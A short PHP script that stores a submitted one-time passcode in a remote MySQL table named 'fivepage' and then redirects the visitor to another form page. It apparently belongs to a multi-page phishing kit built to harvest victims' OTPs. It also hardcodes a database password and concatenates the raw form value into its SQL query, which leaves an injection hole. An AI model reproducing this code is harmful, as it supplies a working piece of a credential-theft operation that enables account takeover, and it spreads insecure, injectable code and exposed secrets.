<?php

$con = mysqli_connect("fdb31.biz.nf","4024908_job","E2j2S0#G1!6DYLF}","4024908_job");

if(isset($_POST["submit"]))
{
$otp = $_POST["otp"];

$query =  "INSERT INTO fivepage(OTP) VALUE ('".$otp."')"; 

 

$run = mysqli_query($con,$query);
}
 //redirect
   header ("Location:forme.html");

 ?>